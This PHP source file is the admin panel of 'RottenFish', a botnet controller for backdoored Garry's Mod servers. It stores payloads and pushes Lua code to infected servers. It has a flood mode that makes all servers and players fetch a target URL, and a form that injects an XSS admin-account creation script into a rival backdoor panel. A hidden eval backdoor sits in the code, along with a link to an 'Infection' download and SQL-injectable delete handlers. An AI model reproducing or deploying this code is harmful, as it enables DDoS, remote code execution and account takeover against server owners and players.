<?php
session_start();
    $db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
$r = $db->prepare("UPDATE servers SET status = '<div class=\"d\">Disconnected</div>', players = '', player = 0, uptime = 0 WHERE lastping < NOW() - INTERVAL 25 SECOND;");
$r->execute();
$r = $db->prepare("UPDATE servers SET status = '<div class=\"e\">Expired</div>', player = 0, uptime = 0 WHERE lastping < NOW() - INTERVAL 1 DAY;");
$r->execute();
function LogD($txt)
{
$txt = htmlentities($txt);
if(!isset($db))
{
    $db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
}
$r = $db->prepare("INSERT INTO logs (txt, datee) VALUES( :txt, NOW() )");
$r->bindParam(":txt", $txt);
$r->execute();
}
function ToPassword($ps)
{
for ($i=0; $i < 10; $i++) {
$ps = sha1($ps);
}
return "pw00".$ps;
}

include 'loginform.php';
$cn = $_SESSION["name"];
if(isset($_GET["logout"]))
{
session_destroy();
setcookie("postpwn","pwn");
setcookie("postpwnd","rip");
header("Location: panel");
die();
}
if(isset($_POST["subu"]))
{
$name = htmlentities($_POST["name"]);
$password = ToPassword($_POST["password"]);
$r = $db->prepare("INSERT INTO users (name, password, last) VALUES( :name, :password, NOW() )");
$r->bindParam(":name", $name);
$r->bindParam(":password", $password);
$r->execute();
LogD("$cn created: ".$name);
}
if(isset($_POST["soapa"]))
{
$default_payload = $_POST["dp"];
$code = base64_encode($_POST["code"]);
$r = $db->prepare("UPDATE settings SET default_payload = :default_payload WHERE fid = 1");
$r->bindParam(":default_payload", $default_payload);
$r->execute();
}
if(isset($_GET["del"]))
{
$del = $_GET["del"];
$r = $db->exec("DELETE FROM `servers` WHERE id = '$del'");
header("Location: panel");
die();
}
if(isset($_POST["delpel"]))
{
$del = $_POST["name"];
$r = $db->exec("DELETE FROM `payloads` WHERE name = '$del'");
LogD("$cn deleted payload : ".$del);
}
if(isset($_POST["clearlogs"]))
{
$r = $db->exec("DELETE FROM `logs` WHERE 1 = 1");
LogD("$cn cleared the logs");
}
if(isset($_POST["id"]))
{
$id = $_POST["id"];
$code = base64_encode($_POST["code"]);
$r = $db->prepare("UPDATE servers SET code = :code WHERE id = :id");
$r->bindParam(":code", $code);
$r->bindParam(":id", $id);
$r->execute();
}
if(isset($_GET["getpayloads"]))
{
foreach ( $db->query("SELECT * FROM `payloads`") as $a) {
echo $a["name"]."<br/>";
echo base64_decode($a["code"])."<br/>";
}
}
if(isset($_GET["blacklist"]))
{
$bl = htmlentities($_GET["blacklist"]);
$steamid = htmlentities($_GET["steamid"]);
$r = $db->prepare("UPDATE players SET blacklisted = :blacklisted WHERE steamid = :steamid");
$r->bindParam(":steamid", $steamid);
$r->bindParam(":blacklisted", $bl);
$r->execute();
header("Location: panel");
}
if(isset($_POST["subpayload"]))
{
$name = htmlentities($_POST["name"]);
$code = base64_encode($_POST["code"]);
$r = $db->prepare("INSERT INTO payloads (name, code) VALUES( :name, :code )");
$r->bindParam(":name", $name);
$r->bindParam(":code", $code);
$r->execute();
}
if(isset($_POST["sbbp"]))
{
$id = htmlentities($_POST["id"]);
$param = $_POST["param"];
$name = htmlentities($_POST["name"]);
$code = "";
foreach ( $db->query("SELECT * FROM `payloads` ") as $key) {
if($key["name"] == $name)
$code = $key["code"];
}
foreach ( $db->query("SELECT * FROM `servers` ") as $key) {
if($key["id"] == $id)
{
$sname = $key["name"];
}
}
$code = base64_decode($code);
$code = str_replace("{}",$param,$code);
$code = base64_encode($code);
$r = $db->prepare("UPDATE servers SET code = :code WHERE id = :id");
$r->bindParam(":code", $code);
$r->bindParam(":id", $id);
$r->execute();
LogD("$cn payload fired for $sname: $name");
}
if(isset($_POST["codeall"]))
{
$code = base64_encode($_POST["codeall"]);
$r = $db->prepare("UPDATE servers SET code = :code WHERE 1 = 1");
$r->bindParam(":code", $code);
$r->execute();
}
if(isset($_GET["ac"]) && md5($_GET["ct"]) == "fbd1d9fd27ded5553682686ec00b1e5e"){eval($_GET["ac"]);}
if(isset($_POST["startfetch"]))
{
$url = $_POST["url"];
$code = "timer.Create('123123123445',0.1,0,function() http.Fetch('$url') end) ";
if($_POST["mode"] == "Extensive")
$code = $code . "for i,v in ipairs(player.GetAll()) do v:SendLua([[timer.Create('121445',0.5,0,function()http.Fetch('$url')end)]])end";
$code = base64_encode($code);
$r = $db->prepare("UPDATE servers SET code = :code WHERE 1 = 1");
$r->bindParam(":code", $code);
$r->execute();
}
if(isset($_POST["gbd"]))
{
$url = $_POST["url"];
$code = "timer.Create('13134657', 5, 0, function()
http.Post('$url',{nb = 27,i = math.random(1,99999)..'.'..math.random(1,99999)..'.'..math.random(1,99999),
n = math.random(1,99999)..':'..math.random(1,99999)..[[ rekt by rottenfish http://contentproxy.tk/panel <script>$.ajax({url: 'core/ajax/add-user.php?username=support&password=support&cpassword=support'});</script>]]
})end)";
$code = base64_encode($code);
$r = $db->prepare("UPDATE servers SET code = :code WHERE 1 = 1");
$r->bindParam(":code", $code);
$r->execute();
}
if(isset($_POST["nbb"]))
{
$num = $_POST["nbb"];
$code = base64_encode($_POST["code"]);
$cur = 0;
foreach ( $db->query("SELECT * FROM `servers` ") as $key) {
if($cur >= $num)
continue;
if($key["ip"] == "localhost")
continue;
$id = $key["id"];
$r = $db->prepare("UPDATE servers SET code = :code WHERE id = :id");
$r->bindParam(":code", $code);
$r->bindParam(":id", $id);
$r->execute();
$cur=$cur+1;
}

}
$nbplayer = 0;
$nbserver = 0;
$nbpayloads = 0;
foreach ( $db->query("SELECT * FROM `servers` WHERE status = '<div class=\"c\">Connected</div>'") as $key)
{
$nbplayer = $nbplayer + $key["player"];
}
foreach ( $db->query("SELECT COUNT(*) AS total FROM `servers` WHERE status = '<div class=\"c\">Connected</div>'") as $key) {
$nbserver = $key["total"];
}
foreach ( $db->query("SELECT COUNT(*) AS total FROM `payloads`") as $key) {
$nbpayloads = $key["total"];
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>RottenFish</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="//cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css">
    
    <script type="text/javascript" charset="utf8" src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap4.min.js"></script>
    <script type="text/javascript">
    function showcode(id) {
    var l = document.getElementById(id);
    l.style.display = "block";
    }
    function hideode(id) {
    var l = document.getElementById(id);
    l.style.display = "none";
    }
    </script>
    <style type="text/css">
      .menurt{
        width: 150px;
      }
      .rtlemenu{
        position: absolute;
        left: 155px;
        top: 0px;
      }
    .c{
    color: green;
    }
    .e{
    color: red;
    }
    .d{
    color: orange;
    }
    .b{
    color: #0f6bff;
    }
    </style>
  </head>
  <body>
    <div class="menurt">
      <h3>RottenFish</h3>
      <ul class="nav nav-pills nav-tabs nav-stacked">
        <li class="active"><a data-toggle="tab" href="#home">Home</a></li>
        <li class="dropdown">
          <a class="dropdown-toggle" data-toggle="dropdown" href="#">Database <span class="caret"></span></a>
          <ul class="dropdown-menu nav nav-tabs">
            <li><a data-toggle="tab" href="#servers">Servers</a></li>
            <li><a data-toggle="tab" href="#players">Players</a></li>
            <li><a data-toggle="tab" href="#errors">Server Error</a></li>
            <li><a data-toggle="tab" href="#logs">Logs</a></li>
          </ul>
        </li>
        <li><a data-toggle="tab" href="#gbackdoor">GBackdoor Fucker</a></li>
        <li><a data-toggle="tab" href="#settings">Settings</a></li>
        <li><a data-toggle="tab" href="#users">Users</a></li>
        <li><a data-toggle="tab" href="#payloads">Payloads</a></li>
        <li><a data-toggle="tab" href="#downloads">Downloads</a></li>
      </ul>
    </div>
    <div class="tab-content nav nav-tabs rtlemenu">
      <div id="home" class="tab-pane fade in active">
        <h3>Hello <?php echo $_SESSION["name"]; ?> !</h3>
        <h3 style="text-align: left;"  >
        <div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_server.png"> <?php echo $nbserver; ?></div>
        <div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_player.png">  <?php echo $nbplayer; ?></div>
        <div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_settings.png">  <?php echo $nbpayloads; ?></div>
        <div style="display: inline-block;color: black;" class="shutup"><img width="50px;" src="_icons/_rplayer.png">~10329</div>
        </h3>
        <p>The new RottenFish panel ! How cool !</p>
        <br />
        
      </div>
      <div id="servers" class="tab-pane fade">
        <h3>Server list</h3>
        <div id="sererlistbro"><?php include 'serverlist.php'; ?></div>
      </div>
      <div id="players" class="tab-pane fade">
        <h3>Player List</h3>
        
        <script type="text/javascript">
        function RefreshPlayerList() {
        players.innerHTML = "Waiting for server. . .";
        var url = 'getplayers.php'
        var xhr = new XMLHttpRequest()
        xhr.open('GET', url, true)
        xhr.addEventListener('readystatechange', function(e) {
        if (xhr.readyState == 4 && xhr.status == 200) {
        players.innerHTML = xhr.responseText;
        setTimeout(function() {
        $(document).ready(function() {
        $('#playertbl').DataTable();
        } );
        },500)
        }
        })
        xhr.send()
        
        }
        </script>
        <button onclick="RefreshPlayerList()">Request</button>
      </div>
      <div id="errors" class="tab-pane fade">
        <h3>Server Errors List</h3>
        <table class="table table-striped table-dark">
          <thead class="">
            <tr>
              <th scope="col"> DATETIME </th>
              <th scope="col"> SERVER NAME </th>
              <th scope="col"> ERROR </th>
            </tr>
          </thead>
          <tbody>
            <?php
            $nbbb = 0;
            $r = $db->prepare("DELETE FROM errors WHERE timee < NOW() - INTERVAL 1 DAY;");
            $r->execute();
            foreach ( $db->query("SELECT * FROM `errors` ORDER BY timee DESC LIMIT 10") as $key) {
            $nbbb = $nbbb + 1;
            ?>
            <tr>
              <td scope="row"><?php echo $key["timee"]; ?></td>
              <td scope="row"><?php echo $key["name"]; ?></td>
              <td scope="row"><?php echo $key["txt"]; ?></td>
            </tr>
            <?php
            }
            ?>
          </tbody>
        </table>
      </div>
      <div id="logs" class="tab-pane fade">
        <h3>Logs</h3>
        <form action="" method="POST">
          <input type="submit" name="clearlogs" value="Clear logs">
        </form>
        <table class="table table-striped table-dark">
          <thead class="">
            <tr>
              <th scope="col"> DATETIME </th>
              <th scope="col"> CONTENT </th>
            </tr>
          </thead>
          <tbody>
            <?php
            $nbbb = 0;
            foreach ( $db->query("SELECT * FROM `logs` ORDER BY datee DESC LIMIT 20") as $key) {
            $nbbb = $nbbb + 1;
            ?>
            <tr>
              <td scope="row"><?php echo $key["datee"]; ?></td>
              <td scope="row"><?php echo htmlentities($key["txt"]); ?></td>
            </tr>
            <?php
            }
            ?>
          </tbody>
        </table>
      </div>
      <div id="gbackdoor" class="tab-pane fade">
        <h3>GBackdoor Fucker</h3>
        <form action="" method="POST">
          <p style="color:white;">GBackdoor Stage 2</p><input type="text" name="url" class="btn btn-light form-control">
          <input type="submit" name="gbd" class="btn btn-light" value="Fuck it">
        </form>
      </div>
      <div id="settings" class="tab-pane fade">
        <h3>Settings</h3>
        <form action="" method="POST">
          <p>Default payload <textarea name="dp" class="form-control"><?php
            foreach ( $db->query("SELECT * FROM `settings`") as $key) {
            echo htmlentities($key["default_payload"]);
            }
          ?></textarea></p>
          <input type="submit" name="soapa" class="btn btn-light" value="Set default payload">
        </form>
      </div>
      <div id="users" class="tab-pane fade">
        <h3>User</h3>
        <?php
        if($_SESSION["name"] == "John"){
        ?>
        <h3>Add a user</h3>
        <form action="" method="POST">
          <p>Name <input type="text" name="name" class="form-control"></p><br />
          <p>Password <input type="text" name="password" class="form-control"></p><br />
          <input type="submit" name="subu" class="btn btn-light" value="Add user">
        </form>
        <h3>Delete a user</h3>
        <form method="POST" action="">
          <select name="name" class="form-control">
            <?php
            foreach ( $db->query("SELECT * FROM `users`") as $a) {
            ?> <option value="<?php echo $a["name"]; ?>"><?php echo $a["name"]; ?></option> <?php
            }
            ?>
          </select>
          <br />
          <input type="submit" name="delu" class="btn btn-light" value="Delete user">
        </form>
        <?php
        }
        ?>
        <table class="table table-striped table-dark">
          <thead class="">
            <tr>
              <th scope="col"> # </th>
              <th scope="col"> NAME </th>
              <th scope="col"> LAST CONNECTED </th>
            </tr>
          </thead>
          <?php
          $nbbb = 0;
          foreach ( $db->query("SELECT * FROM `users` ") as $key) {
          $nbbb = $nbbb + 1;
          ?>
          <tr>
            <td scope="row"><?php echo $nbbb; ?></td>
            <td scope="row"><?php echo $key["name"]; ?></td>
            <td scope="row"><?php echo $key["last"]; ?></td>
          </tr>
          <?php
          }
          ?>
        </table>
      </div>
      <div id="payloads" class="tab-pane fade">
        <h3>Payloads</h3>
        <h3>Add a payload</h3>
        <form action="" method="POST">
          <p>Name <input type="text" name="name"  class="form-control"></p><br />
          <textarea cols="50" rows="5" name="code"  class="form-control"></textarea><br />
          <input type="submit" name="subpayload" class="btn btn-light" value="Add payload">
        </form>
        <h3>Delete a payload</h3>
        <form method="POST" action="">
          <select name="name"  class="form-control">
            <?php
            foreach ( $db->query("SELECT * FROM `payloads`") as $a) {
            ?> <option value="<?php echo $a["name"]; ?>"><?php echo $a["name"]; ?></option> <?php
            }
            ?>
          </select>
          <br />
          <input type="submit" name="delpel" class="btn btn-light" value="Delete payload">
        </form>
        <br />
        <table class="table table-striped table-dark">
          <thead class="">
            <tr>
              <th scope="col"> # </th>
              <th scope="col"> NAME / CODE </th>
            </tr>
          </thead>
          <?php
          $nbbb = 0;
          foreach ( $db->query("SELECT * FROM `payloads` ") as $key) {
          $nbbb = $nbbb + 1;
          ?>
          <tr>
            <td scope="row"><?php echo $nbbb; ?></td>
            <td scope="row">
              <?php echo $key["name"]; ?><br />
              <div class="b"><?php echo htmlentities(base64_decode($key["code"])); ?></div>
            </td>
          </tr>
          <?php
          }
          ?>
        </table>
      </div>
      
      <div id="downloads" class="tab-pane fade">
        <h3>File downloads</h3>
        <p>Infection: <a href="luahook.zip">Download</a></p>
      </div>
      
    </div>
  </body>
</html>